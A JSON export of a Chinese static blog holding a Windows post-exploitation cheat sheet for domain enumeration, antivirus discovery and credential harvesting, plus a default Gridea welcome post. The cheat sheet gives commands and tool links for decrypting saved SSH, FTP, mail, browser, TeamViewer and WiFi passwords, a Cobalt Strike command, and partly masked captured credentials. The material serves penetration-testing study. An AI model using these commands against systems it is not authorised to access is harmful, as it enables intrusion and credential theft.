{"posts":[{"title":"Windows 主机信息搜集","content":"1. 主机信息搜集 1.1 IP信息 ipconfig /all 网卡信息 route print 查看路由表 看能到达的地方 arp -a 查看arp表 看缓存 如果有域: net time /domain ## 通过查看dns、时间服务器来获取域控名称。 net group &quot;domaincontrollers&quot; /domain ## 查看域的所有域控。 nltest /domain_trusts ## 查看域信任情况。 1.2 端口信息 netstat -ano 1.3 进程信息 主要是看看开启了哪些进程，管理员进程可能涉及提权，杀软进程可能涉及免杀，还有一些第三方的进程（如向日葵、todesk）可能涉及做权限维持，这种都是根据需要去确定的。 tasklist /svc //查看所有进程 tasklist /v //查看进程启动的用户 taskkill /f /PID //关闭某个pid的进程 wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe //查看本机杀软 1.4 服务收集 主要是可能涉及一些提权，已经从服务中提取敏感信息比如说抓取密码等，可以通过产品和进程去判断。 wmic product get name,version tasklist /svc wmic service list brief //服务信息收集 1.5 计划任务 涉及提权，权限维持等，也可能通过计划任务发现脚本文件中可能存在敏感内容。 schtasks /query 1.6 用户收集 主要是对提权或者横向移动做铺垫。 net user 查看用户 net localgroup Administrators 查看管理员组 whoami 当前用户 如果有域: net user /domain ## 查看域用户有哪些 net group &quot;domain admins&quot; /domain ## 查看域管理员有哪些 1.7 凭证收集 1.7.1 浏览器信息搜集 可支持360、搜狗等：https://github.com/Aquilao/HackBrowserData 支持老IE密码收集的：https://github.com/twelvesec/passcat，也支持其他浏览器 1.7.2 第三方工具收集 Xshell全版本密码解密 https://github.com/JDArmy/SharpXDecrypt cmd窗口命令 执行之后自动获取session并解密。 C:\\Users\\asus\\Desktop\\DEV\\SharpXDecrypt\\bin\\Debug&gt; .\\SharpXDecrypt.exe Xshell全版本凭证一键导出工具!(支持最新Xshell 7系列版本!) Author: 0pen1 Github: https://github.com/JDArmy [!] WARNING: For learning purposes only,please delete it within 24 hours after downloading! [*] Start GetUserPath.... UserPath: E:\\NetSarang Computer\\xshell6 UserPath: C:\\Users\\asus\\Documents\\NetSarang Computer\\7 [*] Get UserPath Success ! [*] Start GetUserSID.... Username: asus userSID: S-1-5-21-736521517-423******97-1340300005-1001 [*] GetUserSID Success ! XSHPath: E:\\NetSarang Computer\\xshell6\\Xshell\\Sessions\\192.168.1.110.xsh Host: 192.168.1.110 UserName: wwwuser Password: www*******Aqx Version: 6.0 XSHPath: C:\\Users\\asus\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions\\192.168.1.110.xsh Host: 192.168.1.110 UserName: wwwuser Password: ww********Aqx Version: 7.1 XSHPath: C:\\Users\\asus\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions\\Tokyo.xsh Host: 198.13.51.134 UserName: root Password: W8*********PN__% Version: 7.1 Cobalt Strike窗口 execute-assembly /path/to/SharpXDecrypt.exe execute-assembly /path/to/SharpXDecrypt.exe &quot;C:\\Users\\asus\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions&quot; FinalShell密码解密 https://github.com/passer-W/FinalShell-Decoder FinalShell配置文件根路径，一般在 Finalshell安装目录/conn目录下 也可将远程主机文件下载到本地解密，输入合法路径后自动生成所有主机配置信息： Foxmail邮件解密 E:\\Foxmail\\Storage\\liudehui\\Accounts\\Account.rec0 用foxmail password decryption软件解密 https://securityxploded.com/foxmail-password-decryptor.php FTP软件FileZilla解密 C:\\Users\\LDH\\AppData\\Roaming\\FileZilla\\recentservers.xml base64解密。 SSH软件SecureCRT解密 https://github.com/HyperSine/how-does-SecureCRT-encrypt-password 通常，它应该存储在名为Hostname的ini文件中。%APPDATA%\\VanDyke\\Config\\Sessions下。 当你找到这个文件时，你会看到： S:&quot;Username&quot;=root S:&quot;Password&quot;= S:&quot;Password V2&quot;=02:7b9f594a1f39bb36bbaa0d9688ee38b3d233c67b338e20e2113f2ba4d328b6fc8c804e3c02324b1eaad57a5b96ac1fc5cc1ae0ee2930e6af2e5e644a28ebe3fc S:&quot;Login Script V2&quot;= ... ... 解密： python3 ./SecureCRTCipher.py dec -v2 7b9f594a1f39bb36bbaa0d9688ee38b3d233c67b338e20e2113f2ba4d328b6fc8c804e3c02324b1eaad57a5b96ac1fc5cc1ae0ee2930e6af2e5e644a28ebe3fc DoubleLabyrinth 如果SecureCRT小于7.3.3版本，那他的会话文件则是： ... ... S:&quot;Username&quot;=root D:&quot;[SSH2] Port&quot;=00000016 S:&quot;Password&quot;=uc71bd1c86f3b804e42432f53247c50d9287f410c7e59166969acab69daa6eaadbe15c0c54c0e076e945a6d82f9e13df2 D:&quot;Session Password Saved&quot;=00000001 ... ... 解密： $ ./SecureCRTCipher.py dec c71bd1c86f3b804e42432f53247c50d9287f410c7e59166969acab69daa6eaadbe15c0c54c0e076e945a6d82f9e13df2 DoubleLabyrinth TeamViewer密码收集 利用CVE-2019-18988漏洞，经过大佬的测试，15版本也存在漏洞。但是，目前最新的15.4.4445版本已经不存在此问题了。 https://github.com/V1V1/DecryptTeamViewer WinSCP/Foxmail/Filezilla/Xmanager/Navicat/向日葵/Chrome/TortoiseSVN解密 https://github.com/RowTeam/SharpDecryptPwd 默认情况下，将工具上传至目标服务器，运行即可。 如，解密WinSCP，会自动寻找地址。 如果拷贝到了本地进行解密，command： SharpDecryptPwd.exe Xmanager /user:user /sid:sid /path:session_path 1.7.3 RDP凭据解密 下载credentialsfileview，https://www.nirsoft.net/utils/credentials_file_view.html 打开后需要输入主机的登录密码才可以解密，其他选项默认不用管，解密后得到结果如下： 1.7.4 WiFi密码收集 通过如下命令获取连接过的wifi密码： for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 1.7.5 其他收集 net share //查看共享 net use //查看ipc$ systeminfo //查看计算机信息（提权可能会用，也能判断域环境已经操作系统版本） wmic startup get command,caption 查看自启动 wmic share get name,path,status 查看共享 net start 查看当前机器启动的服务 cmdkey /l 查看保存的远程连接凭证 1.7.6 微信聊天记录解密/文件浏览 https://github.com/AdminTest0/SharpWxDump 微信聊天记录默认地址：(关于聊天记录文件：MSG.db，超出240MB会自动生成MSG1.db，以此类推) 安装目录\\WeChat Files\\微信用户名\\Msg\\Multi\\MSG0.db &gt; 聊天记录 安装目录\\WeChat Files\\微信用户名\\Msg\\MicroMsg.db &gt; Contact字段 &gt; 好友列表 安装目录\\WeChat Files\\微信用户名\\Msg\\MediaMsg.db &gt; 语音 &gt; 格式为silk 微信文件默认地址： 安装目录\\WeChat Files\\微信用户名\\FileStorage\\File\\ 1.8 配置文件 一个正常的Web应用肯定有对应的数据库账号密码信息，是一个不错的宝藏。 可以使用如下命令寻找包含密码字段的文件： findstr /s /m &quot;password&quot; *.* Tomcat: CATALINA_HOME/conf/tomcat-users.xml Apache: /etc/httpd/conf/httpd.conf Nginx: /etc/nginx/nginx.conf Wdcp: /www/wdlinux/wdcp/conf/mrpw.conf Mysql: mysql\\data\\mysql\\user.MYD Hosts文件: C:\\WINDOWS\\system32\\drivers\\etc\\hosts ","link":"https://thestary7.github.io/post/windows-zhu-ji-xin-xi-sou-ji/"},{"title":"Hello Gridea","content":"👏 欢迎使用 Gridea ！ ✍️ Gridea 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ... Github Gridea 主页 示例网站 特性👇 📝 你可以使用最酷的 Markdown 语法，进行快速创作 🌉 你可以给文章配上精美的封面图和在文章任意位置插入图片 🏷️ 你可以对文章进行标签分组 📋 你可以自定义菜单，甚至可以创建外部链接菜单 💻 你可以在 Windows，MacOS 或 Linux 设备上使用此客户端 🌎 你可以使用 𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌 或 Coding Pages 向世界展示，未来将支持更多平台 💬 你可以进行简单的配置，接入 Gitalk 或 DisqusJS 评论系统 🇬🇧 你可以使用中文简体或英语 🌁 你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力 🖥 你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步 🌱 当然 Gridea 还很年轻，有很多不足，但请相信，它会不停向前 🏃 未来，它一定会成为你离不开的伙伴 尽情发挥你的才华吧！ 😘 Enjoy~ ","link":"https://thestary7.github.io/post/hello-gridea/"}]}